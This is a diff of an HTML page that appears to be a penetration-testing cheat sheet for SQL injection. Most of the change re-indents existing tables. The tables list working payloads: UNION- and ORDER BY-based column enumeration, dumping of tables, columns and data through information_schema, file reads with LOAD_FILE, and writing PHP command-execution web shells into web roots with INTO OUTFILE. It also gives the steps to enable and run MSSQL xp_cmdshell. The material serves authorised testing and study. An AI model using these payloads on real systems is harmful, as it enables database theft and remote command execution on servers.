@@ -505,176 +505,177 @@ layout: default
                     <td>Method 2</td>
                     <td>Method 3</td>
                     <td>Method 4</td>
+                </tr>
+                <tr>
+                    <td>Enumerate column 1</td>
+                    <td>1 order by 1</td>
+                    <td>' order by 1-- -</td>
+                    <td>' UNION SELECT NULL--</td>
+                    <td>&lt;Legit Search&gt;' order by 1-- -</td>
+                </tr>
+                <tr>
+                    <td>Enumerate column 2</td>
+                    <td>1 order by 2 </td>
+                    <td>' order by 2-- -</td>
+                    <td>' UNION SELECT NULL,NULL--</td>
+                    <td>>&lt;Legit Search&gt;' order by 1,2-- -</td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td>Continue until error</td>
+                    <td>Continue until error</td>
+                    <td>Continue until no error</td>
+                    <td>Continue until no results</td>
+                </tr>
+            </td>
+        </tr>
+        <tr>
+            <td>Find where information appears on the screen</td>
+            <td>
+                <li>1 and 1=2 UNION SELECT 1,2,3,4-- -</li>
+                <li>' UNION SELECT 1,2,3,4-- -</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Enumerate table name</td>
+            <td>
+                <table>
                     <tr>
-                        <td>Enumerate column 1</td>
-                        <td>1 order by 1</td>
-                        <td>' order by 1-- -</td>
-                        <td>' UNION SELECT NULL--</td>
-                        <td>&lt;Legit Search&gt;' order by 1-- -</td>
+                        <td>Enumerate table_1</td>
+                        <td>
+                            <table>
+                                <tr>
+                                    <td>Method #1</td>
+                                    <td>1 and 1=2 UNION SELECT  1,2,3,table_name from information_schema.tables--</td>
+                                </tr>
+                                <tr>
+                                    <td>Method #2</td>
+                                    <td> ' UNION SELECT  table_name,2 from information_schema.tables--</td>
+                                </tr>
+                            </table>
+                        </td>
                     </tr>
                     <tr>
-                        <td>Enumerate column 2</td>
-                        <td>1 order by 2 </td>
-                        <td>' order by 2-- -</td>
-                        <td>' UNION SELECT NULL,NULL--</td>
-                        <td>>&lt;Legit Search&gt;' order by 1,2-- -</td>
+                        <td>Enumerate table_2</td>
+                        <td>' UNION SELECT 1,2,3,table_name from information_schema.tables where table_name not in ('<mark>&lt;table_1&gt;</mark>')--</td>
                     </tr>
                     <tr>
-                        <td></td>
-                        <td>Continue until error</td>
-                        <td>Continue until error</td>
-                        <td>Continue until no error</td>
-                        <td>Continue until no results</td>
+                        <td>Enumerate table_3</td>
+                        <td>' UNION SELECT 1,2,3,table_name from information_schema.tables where table_name not in ('<mark>&lt;table_1&gt;</mark>','<mark>&lt;table_2&gt;</mark>')--</td>
                     </tr>
-                </td>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Enumerate column names</td>
+            <td>
+                <tr>
+                    <td>Enumerate column names</td>
+                    <td>
+                        <table>
+                            <tr>
+                                <td>Enumerate column_1 for table_1</td>
+                                <td>' UNION SELECT column_name,2 from information_schema.columns where table_name='<mark>&lt;table_1&gt;</mark>'--</td>
+                            </tr>
+                            <tr>
+                                <td>Enumerate column_2 for table_1</td>
+                                <td>' UNION SELECT 1,2,3,column_name from information_schema.columns where table_name='<mark>&lt;table_1&gt;</mark>' and column_name not in ('<mark>&lt;column_1&gt;</mark>')</td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </td>
+        </tr>
+        <tr>
+            <td>Enumerate data</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Enumerate data_1 from column_1 of table_1</td>
+                        <td>' UNION SELECT  1,2,3,<mark>&lt;column_1&gt;</mark> from <mark>&lt;table_1&gt;</mark>--</td>
+                    </tr>
+                    <tr>
+                        <td>Enumerate data_2 from column_1 of table_1</td>
+                        <td>' UNION SELECT 1,2,3,<mark>&lt;column_1&gt;</mark> from <mark>&lt;table_1&gt;</mark> where <mark>&lt;column_1&gt;</mark> not in ('<mark>&lt;data_1&gt;</mark>')--</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+
+    <li>Other useful injections</li>
+    <ul>
+        <li>'UNION SELECT 1,<mark>&lt;insert from the below&gt;</mark>,3-- -</li>
+    </ul>
+
+    <table>
+        <tr>
+            <td>Mysql version</td>
+            <td>@@version-- -</td>
+        </tr>
+        <tr>
+            <td>Mysql user</td>
+            <td>
+                <li>user()</li>
+                <li>system_user()</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Read file</td>
+            <td>LOAD_FILE('<mark>&lt;File&gt;</mark>')</td>
+        </tr>
+        <tr>
+            <td>Reveal data directory</td>
+            <td>@@datadir</td>
+        </tr>
+        <tr>
+            <td>Display file contents in base64</td>
+            <td>
+                <li>TO_BASE64(<mark>&lt;file&gt;</mark>)</li>
+                <li>(select TO_BASE64(LOAD_FILE("C:\\inetpub\\wwwroot\\uploads\\shell.php")))</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Create file</td>
+            <td>'union select ("<text>"),2,3,4,5,6 INTO OUTFILE '&lt;directory&gt;'-- -</td>
             </tr>
             <tr>
-                <td>Find where information appears on the screen</td>
+                <td>Create a reverse shell</td>
                 <td>
-                    <li>1 and 1=2 UNION SELECT 1,2,3,4-- -</li>
-                    <li>' UNION SELECT 1,2,3,4-- -</li>
-                </td>
-            </tr>
-            <tr>
-                <td>Enumerate table name</td>
-                <td>
+                    <li>' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -</li>
+                        <li>' UNION SELECT (<?php echo exec($_GET["cmd"]);) INTO OUTFILE '/srv/http/cmd.php';-- -</li>
+                        </td>
+                    </tr>
+                </table>
+
+                <li>MSSQL</li>
+                <ul>
+                    <li>xp_cmdshell</li>
+                    <ul>
+                        <li>Only executable by 'sa' or other users with 'sysadmin' privileges</li>
+                        <li>Available by default on all MSSQL (Disabled on MSSQL 2005)</li>
+                    </ul>
                     <table>
                         <tr>
-                            <td>Enumerate table_1</td>
+                            <td>Enable xp_cmdshell</td>
                             <td>
                                 <table>
                                     <tr>
-                                        <td>Method #1</td>
-                                        <td>1 and 1=2 UNION SELECT  1,2,3,table_name from information_schema.tables--</td>
+                                        <td>Step #1</td>
+                                        <td>EXEC sp_configure 'show advanced options', 1; RECONFIGURE</td>
                                     </tr>
                                     <tr>
-                                        <td>Method #2</td>
-                                        <td> ' UNION SELECT  table_name,2 from information_schema.tables--</td>
+                                        <td>Step #2</td>
+                                        <td>EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE</td>
                                     </tr>
                                 </table>
                             </td>
                         </tr>
                         <tr>
-                            <td>Enumerate table_2</td>
-                            <td>' UNION SELECT 1,2,3,table_name from information_schema.tables where table_name not in ('<mark>&lt;table_1&gt;</mark>')--</td>
-                        </tr>
-                        <tr>
-                            <td>Enumerate table_3</td>
-                            <td>' UNION SELECT 1,2,3,table_name from information_schema.tables where table_name not in ('<mark>&lt;table_1&gt;</mark>','<mark>&lt;table_2&gt;</mark>')--</td>
+                            <td>Execute xp_cmdshell</td>
+                            <td>EXEC xp_cmdshell &quot;&lt;system command&gt;&quot;</td>
                         </tr>
                     </table>
-                </td>
-            </tr>
-            <tr>
-                <td>Enumerate column names</td>
-                <td>
-                    <tr>
-                        <td>Enumerate column names</td>
-                        <td>
-                            <table>
-                                <tr>
-                                    <td>Enumerate column_1 for table_1</td>
-                                    <td>' UNION SELECT column_name,2 from information_schema.columns where table_name='<mark>&lt;table_1&gt;</mark>'--</td>
-                                </tr>
-                                <tr>
-                                    <td>Enumerate column_2 for table_1</td>
-                                    <td>' UNION SELECT 1,2,3,column_name from information_schema.columns where table_name='<mark>&lt;table_1&gt;</mark>' and column_name not in ('<mark>&lt;column_1&gt;</mark>')</td>
-                                </tr>
-                            </table>
-                        </td>
-                    </tr>
-                </td>
-            </tr>
-            <tr>
-                <td>Enumerate data</td>
-                <td>
-                    <table>
-                        <tr>
-                            <td>Enumerate data_1 from column_1 of table_1</td>
-                            <td>' UNION SELECT  1,2,3,<mark>&lt;column_1&gt;</mark> from <mark>&lt;table_1&gt;</mark>--</td>
-                        </tr>
-                        <tr>
-                            <td>Enumerate data_2 from column_1 of table_1</td>
-                            <td>' UNION SELECT 1,2,3,<mark>&lt;column_1&gt;</mark> from <mark>&lt;table_1&gt;</mark> where <mark>&lt;column_1&gt;</mark> not in ('<mark>&lt;data_1&gt;</mark>')--</td>
-                        </tr>
-                    </table>
-                </td>
-            </tr>
-        </table>
-
-        <li>Other useful injections</li>
-        <ul>
-            <li>'UNION SELECT 1,<mark>&lt;insert from the below&gt;</mark>,3-- -</li>
-        </ul>
-
-        <table>
-            <tr>
-                <td>Mysql version</td>
-                <td>@@version-- -</td>
-            </tr>
-            <tr>
-                <td>Mysql user</td>
-                <td>
-                    <li>user()</li>
-                    <li>system_user()</li>
-                </td>
-            </tr>
-            <tr>
-                <td>Read file</td>
-                <td>LOAD_FILE('<mark>&lt;File&gt;</mark>')</td>
-            </tr>
-            <tr>
-                <td>Reveal data directory</td>
-                <td>@@datadir</td>
-            </tr>
-            <tr>
-                <td>Display file contents in base64</td>
-                <td>
-                    <li>TO_BASE64(<mark>&lt;file&gt;</mark>)</li>
-                    <li>(select TO_BASE64(LOAD_FILE("C:\\inetpub\\wwwroot\\uploads\\shell.php")))</li>
-                </td>
-            </tr>
-            <tr>
-                <td>Create file</td>
-                <td>'union select ("<text>"),2,3,4,5,6 INTO OUTFILE '&lt;directory&gt;'-- -</td>
-                </tr>
-                <tr>
-                    <td>Create a reverse shell</td>
-                    <td>
-                        <li>' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -</li>
-                            <li>' UNION SELECT (<?php echo exec($_GET["cmd"]);) INTO OUTFILE '/srv/http/cmd.php';-- -</li>
-                            </td>
-                        </tr>
-                    </table>
-
-                    <li>MSSQL</li>
-                    <ul>
-                        <li>xp_cmdshell</li>
-                        <ul>
-                            <li>Only executable by 'sa' or other users with 'sysadmin' privileges</li>
-                            <li>Available by default on all MSSQL (Disabled on MSSQL 2005)</li>
-                        </ul>
-                        <table>
-                            <tr>
-                                <td>Enable xp_cmdshell</td>
-                                <td>
-                                    <table>
-                                        <tr>
-                                            <td>Step #1</td>
-                                            <td>EXEC sp_configure 'show advanced options', 1; RECONFIGURE</td>
-                                        </tr>
-                                        <tr>
-                                            <td>Step #2</td>
-                                            <td>EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE</td>
-                                        </tr>
-                                    </table>
-                                </td>
-                            </tr>
-                            <tr>
-                                <td>Execute xp_cmdshell</td>
-                                <td>EXEC xp_cmdshell &quot;&lt;system command&gt;&quot;</td>
-                            </tr>
-                        </table>
-                    </ul>
+                </ul>
 
 
